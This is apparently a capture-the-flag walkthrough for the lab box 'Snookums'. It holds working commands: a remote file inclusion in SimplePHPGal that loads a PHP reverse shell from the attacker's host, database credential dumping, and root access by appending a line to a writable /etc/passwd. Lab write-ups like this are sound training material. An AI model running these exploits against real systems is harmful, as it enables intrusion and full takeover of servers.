# Snookums

### Enumeration

```
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Simple PHP Photo Gallery
```

SimplePHPGal 0.8

SimplePHPGal 0.7 - Remote File Inclusion

[https://www.exploit-db.com/exploits/48424](https://www.exploit-db.com/exploits/48424)

```
http://192.168.112.58/image.php?img=http://192.168.49.112

$ nc -nvlp 80                                   
listening on [any] 80 ...
connect to [192.168.49.112] from (UNKNOWN) [192.168.112.58] 35926
GET / HTTP/1.0
Host: 192.168.49.112
```

RFI on 0.8 version too.

### Initial Access

[https://www.revshells.com/](https://www.revshells.com) - PHP Ivan Sincek - 192.168.49.112 22 /bin/bash -> shell.php

```
http://192.168.112.58/image.php?img=http://192.168.49.112/shell.php
```

### Lateral Movement

```
$ cat db.php
<?php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPASS', '[REDACTED]');
define('DBNAME', 'SimplePHPGal');
?>

mysql> select * from users;
select * from users;
+----------+----------------------------------------------+
| username | password                                     |
+----------+----------------------------------------------+
| josh     | [REDACTED]=                                  |
| michael  | [REDACTED]==                                 |
| serena   | [REDACTED]==                                 |
+----------+----------------------------------------------+
3 rows in set (0.01 sec)
```

There are base64 encoded passwords.

```
$ su michael
```

### PrivEsc

```
[michael@snookums ~]$ ls -lha /etc/passwd
-rw-r--r--. 1 michael root 1.2K Jun 11  2020 /etc/passwd
```

There is writable system file.

```
[michael@snookums ~]$ echo "ch:\$1\$ignite\$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash" >> /etc/passwd
ch:pass123
```
